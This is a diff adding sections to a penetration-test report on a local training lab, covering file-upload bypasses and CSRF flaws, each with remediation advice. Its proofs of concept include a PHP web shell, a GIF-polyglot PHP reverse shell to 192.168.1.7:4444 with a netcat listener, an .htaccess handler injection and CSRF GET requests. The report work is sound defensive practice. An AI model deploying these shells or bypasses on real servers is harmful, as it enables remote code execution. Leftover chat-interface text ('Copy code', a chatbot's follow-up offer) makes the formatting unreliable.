@@ -1,4 +1,4 @@
-# Web Application Vulnerability Assessment Report
+<img width="953" height="1035" alt="Blacklist_11" src="https://github.com/user-attachments/assets/274fdadd-5b7b-4454-b1e8-eca6760b725c" /># Web Application Vulnerability Assessment Report
 
 ---
 
@@ -1512,3 +1512,445 @@ This confirms that the file inclusion filter can be bypassed.
 - Reject any input containing directory traversal patterns
 - Replace dynamic file inclusion with static routing logic
 <img width="923" height="819" alt="find_capital_B" src="https://github.com/user-attachments/assets/e4accf5c-04ff-4fa3-b083-d060973be9f3" />
+
+
+#### 5.7.1 Unrestricted File Upload – Arbitrary File Upload
+
+#### Severity
+Critical
+
+#### CVSS v3.1 Score
+9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+
+#### Affected Component
+File upload functionality in the “Unrestricted” upload feature.
+
+#### Description
+An Unrestricted File Upload vulnerability was identified in the file upload functionality of the application. Although the interface claims to allow only image formats (gif, jpg, jpeg, png), the application does not enforce any server-side validation on uploaded files.
+
+As a result, an attacker can upload arbitrary files, including executable server-side scripts. The uploaded files are stored in a web-accessible directory and can be directly accessed and executed by the server.
+
+This allows attackers to upload a malicious PHP web shell and achieve remote code execution on the server.
+
+#### Root Cause
+The application fails to implement proper server-side file validation. It relies solely on client-side restrictions or file extension hints, without validating:
+- File type
+- File extension
+- MIME type
+- Executable content
+
+Additionally, uploaded files are stored inside a web-accessible directory with execution permissions enabled.
+
+#### Proof of Concept
+A malicious PHP web shell is uploaded using the file upload functionality:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+The application confirms successful upload and displays the file path:
+
+bash
+Copy code
+uploads/shell.php
+By accessing the uploaded file directly in the browser:
+
+bash
+Copy code
+http://localhost:1337/uploads/shell.php?cmd=id
+The command is executed on the server, confirming remote code execution.
+<img width="743" height="782" alt="unristricted" src="https://github.com/user-attachments/assets/c661d37d-e567-4fb9-b0c2-253c3016905d" />
+
+
+Impact
+Remote code execution on the server
+
+Full compromise of application and hosting environment
+Ability to read, modify, or delete server files
+Potential lateral movement within the network
+Complete loss of confidentiality, integrity, and availability
+
+Recommendation
+Implement strict server-side validation of uploaded files
+Enforce allow-list validation on file extensions and MIME types
+Rename uploaded files and remove executable permissions
+Store uploads outside the web root
+
+#### 5.7.2 Insecure File Upload – MIME Type Validation Bypass
+
+#### Severity
+High
+
+#### CVSS v3.1 Score
+8.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
+
+#### Affected Component
+File upload functionality using MIME type validation.
+
+#### Description
+An insecure file upload vulnerability was identified in the MIME Type–based file upload functionality of the application. The application attempts to restrict uploads by validating the `Content-Type` header of uploaded files and only allows specific MIME types (gif, jpg, jpeg, png).
+
+However, MIME type validation is performed solely based on the client-supplied `Content-Type` header, which can be manipulated by an attacker. Since the server does not verify the actual file content or enforce strict server-side validation, this approach is insufficient to prevent malicious file uploads.
+
+Although direct upload of executable files is blocked when an invalid MIME type is detected, relying on client-controlled headers makes the protection weak and bypassable in real-world scenarios.
+
+#### Root Cause
+The application trusts the client-supplied `Content-Type` header for file validation. No content-based inspection, extension validation, or execution restriction is applied on the server side.
+
+This results in ineffective protection against malicious file uploads.
+
+#### Proof of Concept
+A normal image upload uses a valid MIME type:
+
+Content-Type: image/png
+
+vbnet
+Copy code
+
+When attempting to upload a PHP file with an invalid MIME type:
+
+Content-Type: application/x-php
+
+csharp
+Copy code
+
+The application rejects the upload with the following message:
+
+Unauthorized file type found.
+Please upload gif, jpg, jpeg or png.
+
+pgsql
+Copy code
+
+This confirms that MIME type validation is present but relies solely on client-controlled headers.
+
+<img width="959" height="890" alt="MIME_type" src="https://github.com/user-attachments/assets/d2020789-75f5-49be-adf5-c7fc733a3d25" />
+<img width="960" height="1044" alt="MIME_type2" src="https://github.com/user-attachments/assets/0c5cd671-2b36-4b52-8275-3bb5e9d6dcb2" />
+<img width="1920" height="877" alt="MIME_type1" src="https://github.com/user-attachments/assets/5274e112-4456-44f7-b500-a7ef3ef29b68" />
+
+
+#### Impact
+- File upload protection can be bypassed in real-world scenarios
+- Risk of malicious file upload if combined with extension spoofing or polyglot files
+- Potential path to remote code execution
+- False sense of security due to weak validation logic
+
+#### Recommendation
+- Do not rely on client-supplied MIME types for validation
+- Implement strict allow-list validation on file extensions
+- Perform server-side content inspection (magic bytes)
+- Rename uploaded files and remove executable permissions
+- Store uploaded files outside the web root
+- Disable script execution in upload directories
+
+#### 5.7.3 Insecure File Upload – Magic Header Validation Bypass
+
+#### Severity
+Critical
+
+#### CVSS v3.1 Score
+9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+
+#### Affected Component
+File upload functionality using magic header (file signature) validation.
+
+#### Description
+An insecure file upload vulnerability was identified in the Magic Header–based upload functionality of the application. The application attempts to validate uploaded files by checking their file signatures (magic bytes) to ensure that only image files are accepted.
+
+However, the validation mechanism only checks the presence of image magic headers (e.g., `GIF87a`) and does not validate the complete file content. By crafting a polyglot file that starts with valid image magic bytes followed by executable PHP code, an attacker can bypass the file validation logic.
+
+The uploaded file is stored in a web-accessible directory and executed by the server, resulting in remote code execution.
+
+#### Root Cause
+The application relies solely on magic header validation to determine file legitimacy. It does not:
+- Validate the full file structure
+- Restrict executable file extensions
+- Disable script execution in the upload directory
+
+This allows attackers to upload polyglot files that pass validation while containing malicious executable code.
+
+#### Proof of Concept
+A malicious PHP reverse shell is crafted with valid image magic bytes at the beginning:
+
+```php
+GIF87a
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/4444 0>&1'");
+?>
+```
+The file is uploaded successfully and stored as:
+
+bash
+Copy code
+uploads/shell.php
+A listener is started on the attacker machine:
+
+bash
+Copy code
+nc -lvnp 4444
+When the uploaded file is accessed, a reverse shell connection is received:
+
+kotlin
+Copy code
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+This confirms successful remote code execution.
+
+Impact
+Full remote code execution on the web server
+
+Complete compromise of application and hosting environment
+
+Ability to execute arbitrary system commands
+
+Potential lateral movement and data exfiltration
+
+Loss of confidentiality, integrity, and availability
+
+Recommendation
+Do not rely solely on magic header validation
+
+Enforce strict allow-list validation on file extensions
+
+Perform deep content inspection of uploaded files
+
+Rename uploaded files and remove executable extensions
+
+Store uploads outside the web root
+
+Disable script execution in upload directories
+
+Apply least-privilege permissions to web server processes
+<img width="946" height="330" alt="magic_header1" src="https://github.com/user-attachments/assets/264c6028-0aa6-4b03-905b-c32fbc7f9b16" />
+<img width="1912" height="996" alt="Magic_header" src="https://github.com/user-attachments/assets/abb3d63d-cc68-4e32-81af-630ab58da497" />
+
+#### 5.7.4 Blacklist-Based File Upload Bypass – Extension Manipulation
+
+#### Severity
+High
+
+#### CVSS v3.1 Score
+8.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)
+
+#### Affected Component
+File upload functionality using blacklist-based extension filtering.
+
+#### Description
+A blacklist-based file upload vulnerability was identified in the application where only specific file extensions are blocked instead of enforcing a strict allowlist. The application attempts to prevent malicious uploads by blacklisting certain executable extensions such as `.php`.
+
+However, this approach can be bypassed by using alternative executable extensions such as `.phtml`, which are still interpreted by the web server as PHP files. The application fails to validate the actual execution context of uploaded files and stores them in a web-accessible directory.
+
+As a result, an attacker can upload a PHP payload using a non-blacklisted extension and achieve server-side code execution.
+
+#### Root Cause
+The application relies on a blacklist approach for file extension validation rather than a strict allowlist. It does not account for alternative executable extensions supported by the server (e.g., `.phtml`, `.php5`).
+
+#### Proof of Concept
+A PHP reverse shell is uploaded using a bypassed extension:
+
+Filename: shell.phtml
+Content-Type: application/x-php
+
+csharp
+Copy code
+
+The file upload is accepted successfully and stored at:
+
+uploads/shell.phtml
+<img width="953" height="1035" alt="Blacklist_11" src="https://github.com/user-attachments/assets/c4a111c0-7c2c-49b4-bc7e-950385cd1d6c" />
+<img width="1920" height="1002" alt="Blacklist_1" src="https://github.com/user-attachments/assets/1d7a7698-0722-4d60-ae05-5b0909181594" />
+
+
+markdown
+Copy code
+
+When accessed via the browser, the payload executes on the server, confirming code execution.
+
+#### Impact
+- Server-side code execution
+- Unauthorized command execution
+- Potential full compromise of the application
+- Loss of confidentiality and integrity
+
+#### Recommendation
+- Use a strict allowlist for file extensions
+- Reject all executable extensions regardless of blacklist
+- Store uploaded files outside the web root
+- Disable script execution in upload directories
+- Validate files using multiple layers (extension, MIME, content inspection)
+#### 5.7.5 Blacklist-Based File Upload Bypass – Server Configuration Injection
+
+#### Severity
+Critical
+
+#### CVSS v3.1 Score
+9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
+
+#### Affected Component
+File upload functionality allowing upload of server configuration files.
+
+#### Description
+A critical file upload vulnerability was identified in the application where blacklist-based filtering fails to block server configuration files such as `.htaccess`. The application allows unrestricted upload of `.htaccess` files into a web-accessible directory.
+
+By uploading a malicious `.htaccess` file, an attacker can modify the server’s execution behavior and force the web server to treat custom file extensions as executable PHP files.
+
+This misconfiguration allows a second-stage payload to be uploaded and executed, leading to full remote code execution.
+
+#### Root Cause
+The application does not restrict uploads of server configuration files and relies solely on extension blacklisting. It also allows execution rules to be modified within the uploads directory.
+
+#### Proof of Concept
+A malicious `.htaccess` file is uploaded containing:
+
+```
+AddType application/x-httpd-php .evil
+The file is stored as:
+```
+
+bash
+Copy code
+uploads/.htaccess
+A PHP reverse shell is then uploaded with a custom extension:
+
+Copy code
+shell.php.evil
+The file is successfully executed by accessing it through the browser, resulting in a reverse shell connection as www-data.
+
+Impact
+Full remote code execution
+
+Complete compromise of the web server
+
+Ability to modify server behavior
+
+High risk of lateral movement and persistence
+
+Complete loss of confidentiality, integrity, and availability
+
+Recommendation
+Block uploads of server configuration files (e.g., .htaccess)
+
+Disable AllowOverride for upload directories
+
+Enforce strict allowlist validation
+
+Store uploads outside the web root
+
+Prevent execution permissions in upload directories<img width="952" height="895" alt="blacklist23" src="https://github.com/user-attachments/assets/4f7c5df8-4189-4c80-9268-50e0a62934be" />
+<img width="959" height="828" alt="blacklist22" src="https://github.com/user-attachments/assets/82c5cce0-49fd-4a26-9994-626501b642cc" />
+<img width="413" height="163" alt="blacklist21" src="https://github.com/user-attachments/assets/d3823d1b-0931-40ef-a8d3-ceaa5666010b" />
+
+### 5.8.1 CSRF – Changing Admin Password
+Vulnerability Description
+
+The application allows password changes through a state-changing request without implementing CSRF protection mechanisms. An authenticated admin user can be forced to change their password by visiting a crafted malicious URL.
+
+Affected Functionality
+
+Password change functionality
+
+Proof of Concept (PoC)
+
+An attacker crafts the following GET request and tricks the admin into opening it:
+
+GET /lab/csrf/changing-password/index.php?new_password=admin&confirm_password=admin
+
+
+When the admin visits this link while logged in, the password is changed without any confirmation or CSRF token validation.
+
+Impact
+
+Unauthorized password change of the admin account
+
+Complete account takeover
+
+Privilege escalation
+
+Root Cause
+
+State-changing operation allowed via GET request
+
+Absence of CSRF tokens
+
+No Origin or Referer validation
+
+5.8.2 CSRF – Unauthorized Money Transfer
+Vulnerability Description
+
+The money transfer functionality processes requests without CSRF protection, allowing attackers to force authenticated users to transfer funds without authorization.
+
+Affected Functionality
+
+Money transfer feature
+
+Proof of Concept (PoC)
+
+The following crafted GET request was used:
+
+GET /lab/csrf/money-transfer/index.php?transfer_amount=2000&receiver=admin
+
+
+When an authenticated admin user accesses this link, money is transferred without explicit approval.
+
+Impact
+
+Unauthorized financial transactions
+
+Manipulation of account balances
+
+Potential financial loss
+
+Root Cause
+
+Missing CSRF token validation
+
+Sensitive actions performed via GET requests
+
+No user interaction verification
+
+5.8.3 CSRF – Forced Follow Action
+Vulnerability Description
+
+The application allows users to follow accounts via a GET request without CSRF protection, enabling attackers to force follow actions.
+
+Affected Functionality
+
+Follow user feature
+
+Proof of Concept (PoC)
+
+An attacker can use the following request:
+
+GET /lab/csrf/follow/index.php?follow=follow
+
+
+If a logged-in user visits this URL, the follow action is executed automatically.
+
+Impact
+
+Unauthorized social interactions
+
+Manipulation of user relationships
+
+Loss of user trust
+
+Root Cause
+
+CSRF-prone GET requests
+
+No anti-CSRF tokens
+
+Missing Origin/Referer checks
+
+✅ Status
+
+All three CSRF vulnerabilities were successfully exploited, confirming the absence of CSRF protections across multiple sensitive functionalities.
+
+If you want, next I can:
+
+Add CVSS 3.1 scores for all three
+
+Merge them into one combined CSRF finding (recommended for reports)
+
+Convert this directly into SysReptor-ready format
+<img width="961" height="817" alt="changing_password_csrf" src="https://github.com/user-attachments/assets/2b231ef7-d063-418a-9066-d0e8093bd4cb" />
+<img width="958" height="945" alt="changing_password_csrf2" src="https://github.com/user-attachments/assets/1635b6ca-2c55-46c2-aa4e-2409db4345ec" />
+<img width="959" height="945" alt="changing_password_csrf1" src="https://github.com/user-attachments/assets/ccce643b-4b47-49c2-8875-d25ad87a3c99" />
